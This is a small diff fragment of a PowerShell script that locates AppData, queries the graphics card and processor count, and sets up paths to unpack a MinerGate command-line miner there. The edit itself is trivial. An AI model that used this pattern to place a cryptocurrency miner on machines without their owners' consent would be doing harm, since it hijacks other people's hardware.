@@ -101,7 +101,7 @@ function CreateDirectoryIfNeeded ( [string] $Directory ){
 $dir = $env:AppData
 $lcard =  $(wmic path win32_VideoController get name)
 $numprocessor = $env:NUMBER_OF_PROCESSORS
-$minerrar = "$dir\MinerGate-cli-4.04-win64.rar"
+$minerrar = $("$dir\MinerGate-cli-4.04-win64.rar")
 $file = "$dir\UnRAR.exe"
 $miner = $minerrar.replace(".rar","")
 
